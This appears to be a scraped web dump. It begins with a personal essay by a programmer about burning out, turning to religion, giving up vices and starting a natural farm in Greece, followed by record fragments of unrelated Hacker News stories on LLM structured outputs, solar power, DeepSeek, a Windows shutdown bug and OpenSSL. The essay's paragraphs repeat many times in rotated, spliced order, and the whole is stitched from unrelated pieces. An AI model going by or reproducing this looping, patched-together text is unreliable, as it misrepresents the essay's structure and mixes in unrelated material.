I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 In 2024, I appeared briefly to tell the world I retired and had \"taken up farming\"1. The vagueness of my message and strangeness surrounding its circumstances created a lot of buzz. It is not every day a person in a cushy, intellectual career drops everything and pivots to working outdoors with their body. It was amusing to read the theories people came up with: from driving a tractor up and down massive tracts of land to being holed up in a Kaczynskiesque cabin in the woods.Today, I return to the internet to tell my story and announcehttps://WILD.gr.For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 Today, I return to the internet to tell my story and announcehttps://WILD.gr.For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 For nearly a decade I spent the majority of my waking hours sedentary and staring at a screen. Praised for my work ethic, quick response to messages and sheer number of projects, I was seen as a wizard. People loved what I was doing and I in turn wanted to please them. Chasing attention led to my projects becoming more complex and bigger in scope over time. It became increasingly difficult to maintain them and keep up the wizard persona.This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 This left me tired and worn out. Hump-backed, skinny-limbed, out of shape and in constant pain with a chronic cough from years of smoking among many issues. Abusing substances to sleep and others to wake up and unable to exert myself for more than a few seconds before running out of breath. My diet consisted of meat, potatoes, junk food and little else. Everything around me was in a state of decay from neglect, and the worse life became, the deeper the descent into my work.In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 In the end things reached a breaking point and I started experiencing burn out. This was beyond simply needing some time away. Recovering, getting back to work and soon after burning out again, this cycle continued and got progressively worse until I couldn't work any longer. Many hours were spent sitting at the computer unable to put anything on the screen. My brain was fried.This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974 This culminated in an existential crisis where I asked myself: \"What am I doing with my life?\". The realization? All I was doing day after day, year after year was making the lights on the screen light up a little different and in the process killing myself, to do it as effectively and efficiently as possible.Unable to work any longer, I stopped and abandoned all effort. This then is the cause of my disappearance from the internet. When life gives you signs that you need to make a change, it's best you listen sooner rather than later. Ignored for too long, life forces the change and as it's forced it comes at the worst time attached with a lot of pain.Stopping left a massive void. Without the 16+ hour days lost in computer code, I didn't know what else to do. Eventually, I turned to reading books and bought myself a kindle. I jailbroke it, filled it with public domain ebooks and spent all my time reading. Not much of a reader before this, I had the entire world of literature to choose from.Everything I read made reference to the Bible, something I had never read nor was in any way acquainted with. The references kept appearing and eventually I decided to dive in head first and read it. Putting the King James Version of the Bible on my kindle, over many months I read it cover to cover.At the time, I wouldn't have called myself an Atheist. Agnostic is not the right word to use either. Not that I believed or didn't believe in the existence of God, in truth, I had simply never thought about it. In place of an answer was lack of the preceding question.I finished reading the Bible. It resonated with me in a way nothing else had before. A mirror was put in front of me and I saw myself clearly for the first time. Finding God, I realized how far I had drifted from the straight and narrow. Weak of mind, steeped in sin, ruled by bodily desires and whims of fancy, the life I led could only lead to one place: the broad road alongside the liars, thieves, fornicators, murderers and cheats, for I was one of them.No longer lost and with new found purpose, I set out to return to the straight and narrow. Knowing how I got here and where I had to go, I set out to change my life. Over the next three years I became a different person. One by one I quit cold turkey all vice that had afflicted me. Alcohol, tobacco, marijuana, caffeine, sugar, pornography, masturbation, gaming and processed food. For the first time in my life I gained control over myself.For reasons of spirituality, morality and health, I stopped eating all animal products (meat, fish, dairy, eggs, etc) adopting instead, the diet of my great grandparents: Plants; local, seasonal and whole. From eating only potatoes to eatingeverything. I ate figs for the first time and then proceeded to make up for all the years spentnoteating them.From home I took up calisthenics, yoga and barefoot running (the real kind, without shoes) and slowly reversed every postural problem and muscle imbalance created over the years. I regained my vitality.As a result, my sleep/wake cycle, chronic cough, headaches and other issues resolved and I no longer felt like an old man. All that remained was to decide what to do with my life. From a spiritual perspective, there are only two career paths one can take: farmer or artisan. Anything else unavoidably involves doing evil or is essentially meaningless.I chose the path of farmer and to be more precise, \"Natural Farmer\". A vampire for so long, I needed to work outside in the sunshine with my hands. My family (brother, mother, grandmother) and I set out to acquire land and embark on this new endeavour together. In the village of Amphithea on the Greek island of Euboea (sidenote: In 2018, my family and I moved from Australia to Greece.) we found a small abandoned and neglected estate complete with house, vineyard and olive trees. We called this venture WILD and thus began our life as farmers.When I said \"have taken up farming\"1. This is what I meant. I'm not growing corn and soybeans on 100 acres of land while spraying roundup and other poisons and no, there's no manifesto decrying the system written from a cabin in the woods. There's just me and my family in a sleepy Greek village producing Natural food and living according to Nature. Welcome tohttps://WILD.gr.—Dylan ArapsFootnoteshttps://github.com/dylanarapshttps://news.ycombinator.com/item?id=40726974", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "LLM Structured Outputs Handbook", "url": "https://nanonets.com/cookbooks/structured-llm-outputs", "content": "LLM Structured Outputs Handbook. LLMs mostly produce syntactically valid outputs when we try generating JSON, XML, code, etc., but they can occasionally fail due to their probabilistic nature. This is a problem for developers as we use LLMs programmatically, for tasks like data extraction, code generation, tool calling, etc. There are many deterministic ways to ensure structured LLM outputs. If you are a developer, this handbook covers everything you need. Structured generation is moving too fast. Most resources you find today are already outdated. You have to dig through multiple academic papers, blogs, GitHub repos, and other resources. This handbook brings it all together in a living document that updates regularly. You can read it start-to-finish, or treat it like a lookup table. We're the maintainers ofNanonets-OCR models(VLMs to convert documents into clean, structured Markdown) anddocstrange(open-source document processing library). Updates from the LLM developer community in your inbox. Twice a month.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Handy – Free open source speech-to-text app", "url": "https://github.com/cjpais/Handy", "content": "Handy – Free open source speech-to-text app", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "US electricity demand surged in 2025 – solar handled 61% of it", "url": "https://electrek.co/2026/01/16/us-electricity-demand-surged-in-2025-solar-handled-61-percent/", "content": "US electricity demand surged in 2025 – solar handled 61% of it", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "DeepSeek kicked off 2026 with a new AI training method for scaling", "url": "https://www.businessinsider.com/deepseek-new-ai-training-models-scale-manifold-constrained-analysts-china-2026-1", "content": "DeepSeek kicked off 2026 with a new AI training method for scaling. Every time Lee Chong Ming publishes a story, you’ll get an alert straight to your inbox! Enter your email  By clicking “Sign up”, you agree to receive emails from Business Insider. In addition, you accept Insider’sTerms of ServiceandPrivacy Policy. DeepSeek got the year rolling with a new idea for training AI. And analysts say it could have a massive impact on the industry. The Chinese AI startup published a research paper on Wednesday, describing a method to train large language models that could shape \"the evolution of foundational models,\" it said. The paper, co-authored by its founder Liang Wenfeng, introduces what DeepSeek calls \"Manifold-Constrained Hyper-Connections,\" or mHC, a training approach designed to scale models without them becoming unstable or breaking altogether. As language models grow, researchers often try to improve performance by allowing different parts of a model to share more information internally. However, this increases the risk of the information becoming unstable, the paper said. DeepSeek's latest research enables models to share richer internal communication in a constrained manner, preserving training stability and computational efficiency even as models scale, it added. Wei Sun, the principal analyst for AI at Counterpoint Research, told Business Insider on Friday that the approach is a \"striking breakthrough.\"", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "PCs refuse to shut down after Microsoft patch", "url": "https://www.theregister.com/2026/01/16/patch_tuesday_secure_launch_bug_no_shutdown/", "content": "PCs refuse to shut down after Microsoft patch. We're not saying Copilot has become sentient and decided it doesn't want to lose consciousness. But if it did, it would create Microsoft's January Patch Tuesday update, which has made it so that some PCs flat-out refuse to shut down or hibernate, no matter how many times you try. Ina notice on its Windows release health dashboard, Microsoft confirmed that some PCs running Windows 11 23H2 might fail to power down properly after installing the latest security updates. Instead of slipping into shutdown or hibernation, affected machines stay stubbornly awake, draining batteries and ignoring shutdown like they have a mind of their own and don't want to experience temporary non-existence. The bug appears to be tied to Secure Launch, a security feature that uses virtualization-based protections to ensure only trusted components load during boot. On systems with Secure Launch enabled, attempts to shut down, restart, or hibernate after applying the January patches may fail to complete. From the user's perspective, everything looks normal – until the PC keeps running anyway, refusing to be denied life. Microsoft says that entering the command \"shutdown /s /t 0\" at the command prompt will, in fact, force your PC to turn off, whether it wants to or not. \"Until this issue is resolved, please ensure you save all your work, and shut down when you are done working on your device to avoid the device running out of power instead of hibernating,\" Microsoft said. The firm hasn't offered much in the way of technical detail, nor has it put numbers on how many devices are affected. There's also no fix yet, with Redmond vaguely promising to \"release a resolution for this issue in a future update.\" But isn't that just what a sentient bot might say? This isn't the only post-update gremlin lurking in January's Patch Tuesday bundle. Microsoft has also beenforced to acknowledge a separate issuein which classic Outlook POP account profiles can hang or freeze after installing this month's patches, another reminder that while the bugs being fixed may be invisible, the ones introduced can be painfully obvious. The notice is similarly vague, with Microsoft stating: \"This is an emerging issue, and we don't have all the symptoms yet, but we will update the topic as we understand the issue better.\" Patch Tuesday exists to close security holes, some of them serious, and skipping updates is rarely a great idea. But once again, a batch of fixes has arrived with side effects that range from irritating to disruptive, depending on how much you rely on your system behaving predictably when it's told to turn off. For now, admins and long-suffering Windows users are left watching Microsoft's status pages and waiting for patches to the patches – hoping their machines eventually go to sleep. ®", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The State of OpenSSL for pyca/cryptography", "url": "https://cryptography.io/en/latest/statements/state-of-openssl/", "content": "The State of OpenSSL for pyca/cryptography. Published: January 14, 2026 For the past 12 years, we (Paul Kehrer and Alex Gaynor) have maintained the Pythoncryptographylibrary (also known aspyca/cryptographyorcryptography.io). For that entire period, we’ve relied on OpenSSL to provide core cryptographic algorithms. This past October,we gave a talk at the OpenSSL Conferencedescribing our experiences. This talk focuses on the growing problems we have with OpenSSL’s direction. The mistakes we see in OpenSSL’s development have become so significant that we believe substantial changes are required — either to OpenSSL, or to our reliance on it. Fundamentally, OpenSSL’s trajectory can be understood as a play in three acts: In the pre-Heartbleed era (pre-2014), OpenSSL was under-maintained and languishing, substantially lagging behind expectations. In the immediate post-Heartbleed era, OpenSSL’s maintenance was reinvigorated and it made substantial progress and improvements. It grew a real code review process, began running tests in CI, adopted fuzz testing, and matured its release process. Finally, in 2021 OpenSSL 3 was released. OpenSSL 3 introduced new APIs and had large internal refactors. Relative to previous OpenSSL versions, OpenSSL 3 had significant regressions in performance, complexity, API ergonomics, and didn’t make needed improvements in areas like testing, verification, and memory safety. Over the same period, OpenSSL’s forks have all made progress in these areas. Many of our concerns about OpenSSL’s direction in this time have substantial overlap withthose highlighted by HAProxy. The remainder of this post describes the problems we have with OpenSSL in more detail, and concludes with the changes we are making to our own policies in response. To avoid burying the lede, we intend to pursue several approaches to reducing our reliance on OpenSSL. Compared to OpenSSL 1.1.1, OpenSSL 3 has significant performance regressions in areas such as parsing and key loading. Several years ago, we filed a bug reporting that elliptic curve public key loading had regressed 5-8x between OpenSSL 1.1.1 and 3.0.7. The reason we had noticed this is that performance had gotten so bad that we’d seen it in our test suite runtimes. Since then, OpenSSL has improved performance such that it’sonly3x slower than it used to be. But more significantly, the response to the issue was that, ‘regression was expected with OpenSSL 3, and while there might be some optimizations, we shouldn’t expect it to ever get back to 1.1.1 levels’. Performance regressions can be acceptable, and even appropriate, when they improve other areas of the library, however as we’ll describe, the cause of these regressions has beenothermistakes, and not offsetting improvements. As a result of these sorts of regressions, whenpyca/cryptographymigrated X.509 certificate parsing from OpenSSL to our own Rust code, we got a 10x performance improvement relative to OpenSSL 3 (n.b., some of this improvement is attributable to advantages in our own code, but much is explainable by the OpenSSL 3 regressions). Later, moving public key parsing to our own Rust code made end-to-end X.509 path validation 60% faster — just improving key loading led to a 60% end-to-end improvement, that’s how extreme the overhead of key parsing in OpenSSL was.", "source": "HackerNews", "date": null, "author": null, "score": null}
